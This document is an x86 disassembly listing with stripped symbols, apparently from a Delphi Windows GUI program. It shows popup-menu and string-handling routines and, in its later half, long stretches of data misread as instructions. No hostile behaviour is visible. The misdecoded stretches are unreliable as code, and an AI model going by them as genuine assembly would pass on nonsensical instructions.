pop [ fs : 0x0 ]
add esp 0xc
sub_456fe4
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_456f54
mov edx ebx
and dl 0xfc
mov eax esi
call sub_455b8c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_45703c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_451e88
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_4567f8
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_4567f8
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_457084
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_451e88
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_462268
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403540
mov edx eax
jmp r-xdata
sub_4570d0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_412edc
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_45703c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_455444
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_455940
mov eax [ ebx + 0x34 ]
call sub_452ce8
mov eax ebx
call sub_4562e8
mov eax ebx
call sub_457084
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_452e18
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_457184
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4143bc
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4143bc
cmp ebp [ eax ]
jne r-xdata
sub_4571c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41d9c8
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41d1d4
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41d9c8
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41d1d4
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403540
mov edx [ r-xdata ]
call sub_4034d0
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41d9c8
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41d1d4
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_4572a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_4040e8
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_404354
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4045f4
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_404354
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4045f4
jmp r-xdata
sub_45733c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_404094
mov ebx 0x1
mov eax esi
call sub_404354
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_40427c
sub_4573a0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4573f9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4572a8
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4572a8
mov eax [ ebp - 0x8 ]
pop edx
call sub_4080c8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457400
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040b8
retn
sub_457408
adc al [ eax ]
add [ eax ] al
enter 0x492c 0x0
sub al 0x31
dec ecx
add ah al
sub al 0x49
add al dl
xor [ ecx ] cl
shr [ ecx + ecx * 2 ] 0x0
insb
xor [ ecx ] cl
mov esp 0xa000492c
xor [ ecx ] cl
mov eax 0x1800492c
xor al 0x49
add [ esp + ebp + 0x30a80049 ] dh
dec ecx
add [ eax + 0x6000492c ] dh
xor cl [ ecx ]
lodsb [ esi ]
sub al 0x49
add [ ecx + esi + 0x2ca80049 ] bh
dec ecx
add [ eax - 0x5bffb6cc ] dh
sub al 0x49
add [ esp + esi + 0x2ca00049 ] ch
dec ecx
add [ eax + 0x31 ] bh
dec ecx
add [ esp + ebp + 0x34640049 ] bl
dec ecx
add [ eax + 0x2000492c ] bl
xor al 0x49
add [ esp + ebp + 0x34fc0049 ] dl
dec ecx
add [ eax - 0x2fffb6d4 ] dl
xor al 0x49
add [ esp + ebp + 0x31880049 ] cl
dec ecx
add [ eax - 0x67ffb6d4 ] cl
xor [ ecx ] ecx
test [ ecx + ecx * 2 ] ch
add ah bl
xor [ ecx ] ecx
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_457500
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457507
retn
mov eax [ rw-data ]
call sub_403344
mov eax [ rw-data ]
call sub_403344
mov eax [ rw-data ]
call sub_403344
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404b1c
mov eax rw-data
call sub_404094
sub_45750c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_457408
call sub_403e40
mov eax [ r-xdata ]
call sub_413ba8
mov eax [ r-xdata ]
call sub_413c48
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413bf4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413bf4
mov eax [ r-xdata ]
call sub_413ab8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424dac
mov [ rw-data ] eax
sub_45771c
inc ebp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
insb
inc edx
popad
jb r-xdata
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
jbe r-xdata
jbe r-xdata
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
[ eax - 0x55 ]
adc [ ebx + eax * 2 + 0x6f ] edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + r-xdata ] cl
add [ eax ] al
loopne r-xdata
add [ eax ] al
adc [ eax + eax ] 0x0
add [ ecx + 0x41 ] dl
add [ 0x6f460500 ] cl
jb r-xdata
add [ eax ] al
[ 0x1ff0000 ]
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
inc esp
lodsb [ esi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
mov [ ebp + eax * 2 + 0x100 ] ch
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
outsb
je r-xdata
inc ecx
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ eax ] ch
movsb [ edi ] [ esi ]
inc ebp
add [ ecx ] dl
inc ecx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
or al [ edx + 0x75 ]
je r-xdata
jne r-xdata
jae r-xdata
inc ebp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
jb r-xdata
shl [ esi + esi * 2 + 0x11070045 ] 0x54
inc ebx
outsd
stosd [ edi ]
inc ebp
add [ ecx ] al
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
dec esp
stosd [ edi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax + eax ] ch
add bh bh
push 0x10045ab
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
jmp [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ eax + eax ] ah
add bh bh
or [ ebx + 0x10045 ] ch
cwde
inc esp
add ah al
pushad
dec esi
outsd
jb r-xdata
push esp
inc ebx
outsd
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
add [ eax + ebx * 4 + 0x60c40044 ] bl
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
movsb [ edi ] [ esi ]
jbe r-xdata
jae r-xdata
outsd
insb
outsd
jb r-xdata
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
and [ edx ] bl
inc esp
add [ eax + 0x4d ] bh
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
outsb
je r-xdata
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] edx
or al 0x73
bound ecx [ eax + 0x6f ]
jb r-xdata
jbe r-xdata
pop es
add [ esi ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
add bh bh
sub [ ebx + 0x10045 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
jae r-xdata
jae r-xdata
jpe r-xdata
mov [ ecx + 0x41 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
push esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
mov al [ 0x10045ac ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
add [ eax ] al
je r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
rcr [ ecx + edi * 2 ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jpe r-xdata
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
outsd
je r-xdata
imul eax [ 0x6d726f46 ] 0x73
xor [ esi + 0x45 ] 0x0
outsb
je r-xdata
dec [ eax + 0x10045ac ]
add [ eax ] al
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
outsb
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
shr [ ebp + eax * 2 + 0x45ace400 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
pop eax
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
jns r-xdata
je r-xdata
insb
or dh [ ebx + 0x62 ]
push esi
jb r-xdata
movsd [ edi ] [ esi ]
cmp [ ebx ] ah
inc esp
add [ eax ] bh
add [ esi ] dl
jpe r-xdata
add eax 0x6d726f46
jae r-xdata
add [ eax ] al
imul esp [ ebx + 0x61 ] 0x6f46056c
jb r-xdata
inc ecx
add [ edi + ebp * 4 ] bl
inc ebp
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax + 0x4c ] es
mov dh 0x45
add [ eax ] ah
mov al 0x45
add [ edx ] ah
inc esp
add al dl
scasd [ edi ]
inc ebp
add [ edi + ebx * 2 ] cl
inc esp
add al ah
scasd [ edi ]
inc ebp
add [ edx + 0x62c00044 ] bh
inc esp
add [ eax + 0x61 ] bh
inc esp
add [ eax ] ah
popad
inc esp
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 - 0x4fbfffbc ] al
inc ebp
add al dh
mov dl 0x45
add [ esi * 4 + 0x60045 ] ah
add eax 0x15011400
add [ eax + esi * 4 ] edi
in al dx
inc eax
[ eax ]
cmp [ ebp - 0x5ddfffbf ] ah
inc ecx
add [ eax ] bl
mov [ 0xffffffffa5400041 ] al
add [ edx + eax ] bl
add [ eax ] al
clc
in eax 0x43
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x3ffbfcb ] ah
push 0x32dc0044
inc eax
add al bh
xor al [ eax ]
xchg esp eax
scasd [ edi ]
inc ebp
insb
insb
inc edx
popad
jb r-xdata
dec eax
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x45 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
call sub_403314
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424dac
mov [ rw-data ] eax
retn
fdiv [ ebp + 0x45 ]
add [ ecx ] al
or eax 0x72635354
outsd
insb
insb
inc edx
popad
jb r-xdata
outsb
arpl [ ebx ] ax
add [ eax ] eax
add [ eax ] al
sub_457b3c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0x67980044
inc esp
add al bl
dec eax
inc esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7c ] bl
inc ebp
add [ esi + 0x7c ] ah
inc ebp
add [ edx + eax ] ah
add [ eax ] al
sar [ eax + 0x45 ] 0x1
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ eax + 0x74004035 ] bl
sahf
inc ecx
add [ eax - 0x3ffbfcb ] ah
push 0x32dc0044
inc eax
add al bh
xor al [ eax ]
xchg esp eax
scasd [ edi ]
inc ebp
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
inc esp
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
inc ecx
add [ edi + esi * 4 + 0x45 ] cl
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
inc eax
add [ eax + 0x7c ] bh
inc ebp
add [ edi ] al
or dl [ ebx + edx * 2 + 0x63 ]
jb r-xdata
add [ eax ] al
insb
insb
inc edx
outsd
js r-xdata
shl ah 0x43
outsd
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax + 0x4c ] es
mov dh 0x45
add [ eax ] ah
mov al 0x45
add [ edx ] ah
inc esp
add [ edi + esi * 4 + 0x5f0c0045 ] ch
inc esp
add al ah
scasd [ edi ]
inc ebp
add [ edx + 0x62c00044 ] bh
inc esp
add [ eax + 0x61 ] bh
inc esp
add [ eax ] ah
popad
inc esp
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 - 0x4fbfffbc ] al
inc ebp
add al dh
mov dl 0x45
add [ esi * 4 + 0x20045 ] ah
test [ eax ] al
adc [ eax + sub_45b810 ] dh
sbb [ eax + 0x540a0045 ] bh
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
outsd
js r-xdata
jpo r-xdata
add [ eax + 0x42080016 ] al
insb
dec edi
jne r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
fcomp [ edx + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
add [ eax ] al
push cs
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ edx + edi * 2 ] ch
inc ebp
add [ eax + eax + 0x5 ] al
inc esi
outsd
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax + 0x60ff0001 ] ch
jns r-xdata
add [ eax ] ah
add al [ eax ]
add bh bh
cld
mov bh 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax + eax ] dl
insb
inc ebp
jae r-xdata
add bh bh
cwde
0x10044 0x0
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
str [ edx ]
inc ecx
jne r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
[ ecx + esi * 4 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax + eax ] bl
[ eax + eax ]
jae r-xdata
[ ebx + 0x1ff0000 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] eax
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
in al dx
into
inc ebx
add [ edx ] bh
hlt
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1065646f
jpo r-xdata
or [ edx + 0x65 ] eax
jbe r-xdata
in eax 0x43
add [ ebp + 0x1 ] ah
add bh bh
or al 0x9b
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
pop ss
add [ ebx ] cl
inc edx
outsd
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0x2cff0001
fwait
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ ecx + 0x75 ] al
je r-xdata
add [ eax ] al
in al 0x43
add [ ebx + 0x1 ] ah
add [ eax ] al
adc eax 0x65420a00
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
add [ edi + ecx * 8 ] al
inc ebx
add [ ebx ] bl
add bh bh
sbb al [ fs : eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x6c410500
imul esp [ edi + 0x6e ] r-xdata
popad
add [ eax ] al
jmp [ eax + ebx + 0x19400044 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add bh bh
jpe r-xdata
je r-xdata
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
je r-xdata
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
add [ ecx + eax ] ah
[ eax + 0x100449a ]
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
in al 0x43
push eax
inc esp
add [ edi ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001e ] al
outsd
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
add [ eax ] al
inc [ ecx ]
insb
aam 0xd6
inc ebx
add [ eax + eax ] dh
push [ eax + 0x4a ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
inc esp
mov es [ eax + eax - 0x18 ]
mov es [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001f ] al
je r-xdata
add bh bh
jb r-xdata
add [ eax ] al
add [ ebx ] bl
add [ eax ] cl
inc esp
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
xor eax [ esp + eax - 0x47 ]
inc ecx
add [ eax ] ch
add bh bh
inc esp
inc esp
add [ esi + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
jb r-xdata
aad 0x43
add [ ebx - 0x64010000 ] bl
jb r-xdata
sbb [ esi ] 0x0
add eax 0x6f6c6f43
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
je r-xdata
jne r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
adc al 0x27
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
jo r-xdata
jo r-xdata
adc [ eax ] al
0xc4ff0000 0x4426
add [ ecx ] 0x0
add [ eax ] al
add [ es : esi ] cl
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
inc ebx
popad
outsb
push edx
jae r-xdata
inc esp
add [ eax ] bl
inc esi
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0xbc656c62
fadd [ ebx ]
rol [ eax ] 0x0
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
outsb
je r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
sub [ edi ] 0x0
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
jpe r-xdata
adc [ eax ] al
cdq
add [ eax ] al
jmp [ eax + 0x68004426 ]
pop [ eax + eax - 0x60 ]
pop [ eax + eax + 0x1 ]
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
adc [ eax ] al
test eax 0xf4ff0001
